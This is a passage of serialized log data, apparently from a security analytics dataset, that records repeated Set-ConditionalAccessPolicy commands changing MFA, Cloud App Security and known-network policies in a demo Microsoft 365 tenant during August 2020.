AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/7/2020 3:03:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/7/2020 3:03:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/7/2020 3:03:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/7/2020 5:32:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/7/2020 5:32:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/8/2020 2:05:37 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/8/2020 2:05:37 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/8/2020 5:07:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/8/2020 5:07:46 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/6/2020 5:18:57 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/6/2020 5:18:56 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/9/2020 1:49:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/9/2020 1:49:56 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/9/2020 5:08:00 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/9/2020 5:08:04 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/10/2020 2:30:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/10/2020 2:30:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/10/2020 5:20:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/10/2020 5:20:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/10/2020 5:20:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/10/2020 5:20:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/11/2020 2:42:39 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/11/2020 2:42:41 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/11/2020 5:02:25 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/11/2020 5:02:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/12/2020 1:44:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/12/2020 1:44:50 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/12/2020 5:28:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/12/2020 5:28:44 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': 